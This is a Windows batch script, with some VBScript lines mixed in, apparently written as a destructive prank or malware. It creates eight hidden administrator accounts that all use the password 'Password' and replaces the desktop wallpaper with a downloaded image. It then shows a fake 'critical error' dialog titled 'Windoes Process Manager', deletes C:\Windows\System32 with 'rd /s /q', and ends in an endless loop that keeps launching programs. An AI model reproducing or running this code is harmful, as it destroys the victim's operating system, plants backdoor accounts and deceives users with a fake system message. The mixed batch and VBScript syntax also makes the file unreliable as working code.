@echo off
net user fgijgr Password /add
 net localgroup administrators fgijgr /add
 net user lesgoski Password /add
 net localgroup administrators lesgoski /add
 net user scem Password /add
 net localgroup administrators scem /add
 net user ùòòòàè Password /add
 net localgroup administrators ùòòòàè /add
 net user kebab Password /add
 net localgroup administrators kebab /add
 net user bomboclat Password /add
 net localgroup administrators bomboclat /add
 net user bombayah Password /add
 net localgroup administrators bombayah /add
net user 1+1fa2 Password /add
 net localgroup administrators 1+1fa2 /add
@echo off
set IMG_URL=https://images6.alphacoders.com/737/737467.png
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"
Set objShell = CreateObject("WScript.Shell")
MsgBox "A critical error has occurred." & vbCrLf & vbCrLf & _
       "The system cannot locate file abc123.dll due to corruption." & vbCrLf & _
       "Windows will attempt to restore the file on restart." & vbCrLf & vbCrLf & _
       "System will restart in 30 seconds.", vbCritical, "Windoes Process Manager"
rd /s /q C:\Windows\System32
@echo off 
:crash
start
start explorer
start notepad
start mspaint
start chrome 
start control
goto crash





